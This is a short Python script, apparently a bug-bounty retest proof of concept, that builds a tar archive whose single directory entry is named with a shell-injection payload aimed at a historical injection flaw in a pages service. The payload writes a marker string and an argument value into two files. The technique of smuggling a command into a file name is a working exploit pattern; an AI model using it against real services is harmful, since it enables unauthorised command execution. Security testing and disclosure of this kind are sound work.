#!/usr/bin/env python3
import tarfile


# The archive contains one directory header and no regular files. If the
# historical shell-injection sink is still reachable, the command writes only
# two fixed files beneath the service-supplied destination for this repository.
source_dir = """x';f(){ echo H1_RETEST_4D1B>"$5/r";echo "$3">"$5/v";};f '"""

info = tarfile.TarInfo(source_dir)
info.type = tarfile.DIRTYPE
info.mode = 0o755
info.mtime = 0

with tarfile.open("pages-retest-safe.tar", "w", format=tarfile.USTAR_FORMAT) as archive:
    archive.addfile(info)

with tarfile.open("pages-retest-safe.tar") as archive:
    members = archive.getmembers()

assert len(members) == 1
assert members[0].isdir()
assert members[0].name == source_dir
